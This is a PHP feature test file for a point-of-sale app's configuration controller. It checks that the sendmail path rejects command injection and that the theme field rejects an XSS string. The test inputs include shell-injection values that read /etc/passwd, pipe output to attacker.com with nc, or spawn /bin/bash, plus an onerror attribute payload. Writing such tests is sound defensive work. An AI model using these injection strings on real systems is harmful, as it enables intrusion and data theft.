<?php

namespace Tests\Controllers;

use CodeIgniter\Test\CIUnitTestCase;
use CodeIgniter\Test\DatabaseTestTrait;
use CodeIgniter\Test\FeatureTestTrait;
use CodeIgniter\Config\Services;

class ConfigTest extends CIUnitTestCase
{
    use DatabaseTestTrait;
    use FeatureTestTrait;

    protected $migrate     = true;
    protected $migrateOnce = true;
    protected $refresh     = false;
    protected $namespace   = null;

    protected function setUp(): void
    {
        parent::setUp();
    }

    protected function resetSession(): void
    {
        $session = Services::session();
        $session->destroy();
        $session->set('person_id', 1);
        $session->set('menu_group', 'office');
    }

    // ========== Valid Mailpath Tests ==========

    public function testValidMailpath_AcceptsStandardPath(): void
    {
        $this->resetSession();

        $response = $this->post('/config/saveEmail', [
            'protocol' => 'sendmail',
            'mailpath' => '/usr/sbin/sendmail'
        ]);

        $response->assertStatus(200);
        $result = json_decode($response->getJSON(), true);
        $this->assertTrue($result['success']);
    }

    public function testValidMailpath_AcceptsPathWithDots(): void
    {
        $this->resetSession();

        $response = $this->post('/config/saveEmail', [
            'protocol' => 'sendmail',
            'mailpath' => '/usr/local/bin/sendmail.local'
        ]);

        $response->assertStatus(200);
        $result = json_decode($response->getJSON(), true);
        $this->assertTrue($result['success']);
    }

    public function testValidMailpath_AcceptsEmptyStringForNonSendmailProtocol(): void
    {
        $this->resetSession();

        $response = $this->post('/config/saveEmail', [
            'protocol' => 'mail',
            'mailpath' => ''
        ]);

        $response->assertStatus(200);
        $result = json_decode($response->getJSON(), true);
        $this->assertTrue($result['success']);
    }

    public function testSendmailProtocol_RequiresMailpath(): void
    {
        $this->resetSession();

        $response = $this->post('/config/saveEmail', [
            'protocol' => 'sendmail',
            'mailpath' => ''
        ]);

        $response->assertStatus(200);
        $result = json_decode($response->getJSON(), true);
        $this->assertFalse($result['success']);
        $this->assertStringContainsString('invalid', strtolower($result['message']));
    }

    public function testNonSendmailProtocol_RejectsMaliciousMailpath(): void
    {
        $this->resetSession();

        $response = $this->post('/config/saveEmail', [
            'protocol' => 'smtp',
            'mailpath' => '/usr/sbin/sendmail; cat /etc/passwd'
        ]);

        $response->assertStatus(200);
        $result = json_decode($response->getJSON(), true);
        $this->assertFalse($result['success']);
        $this->assertStringContainsString('invalid', strtolower($result['message']));
    }

    // ========== Command Injection Prevention Tests ==========

    public function testMailpath_RejectsCommandInjection_Semicolon(): void
    {
        $this->resetSession();

        $response = $this->post('/config/saveEmail', [
            'protocol' => 'sendmail',
            'mailpath' => '/usr/sbin/sendmail; cat /etc/passwd'
        ]);

        $response->assertStatus(200);
        $result = json_decode($response->getJSON(), true);
        $this->assertFalse($result['success']);
        $this->assertStringContainsString('invalid', strtolower($result['message']));
    }

    public function testMailpath_RejectsCommandInjection_Pipe(): void
    {
        $this->resetSession();

        $response = $this->post('/config/saveEmail', [
            'protocol' => 'sendmail',
            'mailpath' => '/usr/sbin/sendmail | nc attacker.com 4444'
        ]);

        $response->assertStatus(200);
        $result = json_decode($response->getJSON(), true);
        $this->assertFalse($result['success']);
    }

    public function testMailpath_RejectsCommandInjection_And(): void
    {
        $this->resetSession();

        $response = $this->post('/config/saveEmail', [
            'protocol' => 'sendmail',
            'mailpath' => '/usr/sbin/sendmail && whoami'
        ]);

        $response->assertStatus(200);
        $result = json_decode($response->getJSON(), true);
        $this->assertFalse($result['success']);
    }

    public function testMailpath_RejectsCommandInjection_Backtick(): void
    {
        $this->resetSession();

        $response = $this->post('/config/saveEmail', [
            'protocol' => 'sendmail',
            'mailpath' => '/usr/sbin/`whoami`'
        ]);

        $response->assertStatus(200);
        $result = json_decode($response->getJSON(), true);
        $this->assertFalse($result['success']);
    }

    public function testMailpath_RejectsCommandInjection_Subshell(): void
    {
        $this->resetSession();

        $response = $this->post('/config/saveEmail', [
            'protocol' => 'sendmail',
            'mailpath' => '/usr/sbin/sendmail$(id)'
        ]);

        $response->assertStatus(200);
        $result = json_decode($response->getJSON(), true);
        $this->assertFalse($result['success']);
    }

    public function testMailpath_RejectsCommandInjection_SpaceInPath(): void
    {
        $this->resetSession();

        $response = $this->post('/config/saveEmail', [
            'protocol' => 'sendmail',
            'mailpath' => '/usr/sbin/sendmail -t -i'
        ]);

        $response->assertStatus(200);
        $result = json_decode($response->getJSON(), true);
        $this->assertFalse($result['success']);
    }

    public function testMailpath_RejectsCommandInjection_Newline(): void
    {
        $this->resetSession();

        $response = $this->post('/config/saveEmail', [
            'protocol' => 'sendmail',
            'mailpath' => "/usr/sbin/sendmail\n/bin/bash"
        ]);

        $response->assertStatus(200);
        $result = json_decode($response->getJSON(), true);
        $this->assertFalse($result['success']);
    }

    public function testMailpath_RejectsCommandInjection_DollarSign(): void
    {
        $this->resetSession();

        $response = $this->post('/config/saveEmail', [
            'protocol' => 'sendmail',
            'mailpath' => '/usr/sbin/$SENDMAIL'
        ]);

        $response->assertStatus(200);
        $result = json_decode($response->getJSON(), true);
        $this->assertFalse($result['success']);
    }

    // ========== postSaveLocale: payment_reference_code_min / max ==========

    private function baseLocalePayload(array $overrides = []): array
    {
        return array_merge([
            'language'         => 'en:English',
            'currency_symbol'  => '$',
            'currency_code'    => 'USD',
            'timezone'         => 'UTC',
            'dateformat'       => 'Y-m-d',
            'timeformat'       => 'H:i',
            'number_locale'    => 'en_US',
            'currency_decimals' => '2',
            'tax_decimals'     => '2',
            'quantity_decimals' => '2',
            'cash_decimals'    => '2',
            'country_codes'    => 'US',
            'payment_options_order' => '',
            'cash_rounding_code'    => '',
            'financial_year'        => '1',
        ], $overrides);
    }

    public function testSaveLocale_AcceptsValidReferenceCodeMinMax(): void
    {
        $this->resetSession();

        $response = $this->post('/config/saveLocale', $this->baseLocalePayload([
            'payment_reference_code_min' => '3',
            'payment_reference_code_max' => '20',
        ]));

        $response->assertStatus(200);
        $result = json_decode($response->getJSON(), true);
        $this->assertTrue($result['success']);
    }

    public function testSaveLocale_AcceptsMinEqualToMax(): void
    {
        $this->resetSession();

        $response = $this->post('/config/saveLocale', $this->baseLocalePayload([
            'payment_reference_code_min' => '10',
            'payment_reference_code_max' => '10',
        ]));

        $response->assertStatus(200);
        $result = json_decode($response->getJSON(), true);
        $this->assertTrue($result['success']);
    }

    public function testSaveLocale_SanitizesNonNumericReferenceCodeLimits(): void
    {
        $this->resetSession();

        // FILTER_SANITIZE_NUMBER_INT strips non-numeric chars — controller accepts without error
        $response = $this->post('/config/saveLocale', $this->baseLocalePayload([
            'payment_reference_code_min' => 'abc',
            'payment_reference_code_max' => 'xyz',
        ]));

        $response->assertStatus(200);
        $result = json_decode($response->getJSON(), true);
        $this->assertTrue($result['success']);
    }

    // ========== postSaveGeneral: theme validation ==========

    private function baseGeneralPayload(array $overrides = []): array
    {
        return array_merge([
            'theme'                          => 'flatly',
            'login_form'                     => 'floating_labels',
            'default_sales_discount_type'    => '',
            'default_sales_discount'         => '0.00',
            'default_receivings_discount_type' => '',
            'default_receivings_discount'    => '0.00',
            'enforce_privacy'                => '',
            'receiving_calculate_average_price' => '',
            'lines_per_page'                 => '20',
            'notify_horizontal_position'     => 'bottom',
            'notify_vertical_position'       => 'right',
            'image_max_width'                => '1000',
            'image_max_height'               => '1000',
            'image_max_size'                 => '5120',
            'image_allowed_types'            => ['jpg', 'jpeg', 'gif', 'png'],
            'gcaptcha_enable'                => '',
            'gcaptcha_secret_key'            => '',
            'gcaptcha_site_key'              => '',
            'suggestions_first_column'       => 'name',
            'suggestions_second_column'      => '',
            'suggestions_third_column'       => '',
            'giftcard_number'                => '',
            'derive_sale_quantity'           => '',
            'multi_pack_enabled'             => '',
            'include_hsn'                    => '',
            'category_dropdown'              => '',
            'show_office_group'              => '',
        ], $overrides);
    }

    public function testSaveGeneral_AcceptsValidTheme(): void
    {
        $this->resetSession();

        $response = $this->post('/config/saveGeneral', $this->baseGeneralPayload([
            'theme' => 'darkly',
        ]));

        $response->assertStatus(200);
        $result = json_decode($response->getJSON(), true);
        $this->assertTrue($result['success']);
    }

    public function testSaveGeneral_AcceptsEmptyTheme(): void
    {
        $this->resetSession();

        $response = $this->post('/config/saveGeneral', $this->baseGeneralPayload([
            'theme' => '',
        ]));

        $response->assertStatus(200);
        $result = json_decode($response->getJSON(), true);
        $this->assertTrue($result['success']);
    }

    public function testSaveGeneral_RejectsUnknownTheme(): void
    {
        $this->resetSession();

        $response = $this->post('/config/saveGeneral', $this->baseGeneralPayload([
            'theme' => 'nonexistent',
        ]));

        $response->assertStatus(200);
        $result = json_decode($response->getJSON(), true);
        $this->assertFalse($result['success']);
        $this->assertStringContainsString('theme', strtolower($result['message']));
    }

    public function testSaveGeneral_RejectsXssPayloadInTheme(): void
    {
        $this->resetSession();

        $response = $this->post('/config/saveGeneral', $this->baseGeneralPayload([
            'theme' => 'x" onerror="alert(document.domain)" x="',
        ]));

        $response->assertStatus(200);
        $result = json_decode($response->getJSON(), true);
        $this->assertFalse($result['success']);
        $this->assertStringContainsString('theme', strtolower($result['message']));
    }

    public function testSaveGeneral_RejectsNonThemeDirectory(): void
    {
        $this->resetSession();

        $response = $this->post('/config/saveGeneral', $this->baseGeneralPayload([
            'theme' => 'fonts',
        ]));

        $response->assertStatus(200);
        $result = json_decode($response->getJSON(), true);
        $this->assertFalse($result['success']);
        $this->assertStringContainsString('theme', strtolower($result['message']));
    }
}